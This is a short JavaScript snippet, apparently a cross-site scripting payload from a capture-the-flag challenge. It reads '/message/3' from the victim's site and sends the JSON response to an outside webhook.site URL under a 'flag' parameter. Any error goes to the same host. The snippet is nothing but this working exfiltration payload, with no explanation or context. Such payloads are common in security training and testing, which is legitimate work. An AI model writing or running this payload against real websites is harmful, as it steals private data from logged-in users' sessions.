fetch('/message/3').then(r=>r.json()).then(d=>{
  fetch('https://webhook.site/97b90c33-9617-4d41-a1a2-d054deac91e4?flag='+encodeURIComponent(JSON.stringify(d)));
}).catch(e=>{
  fetch('https://webhook.site/97b90c33-9617-4d41-a1a2-d054deac91e4?err='+encodeURIComponent(e.message));
});
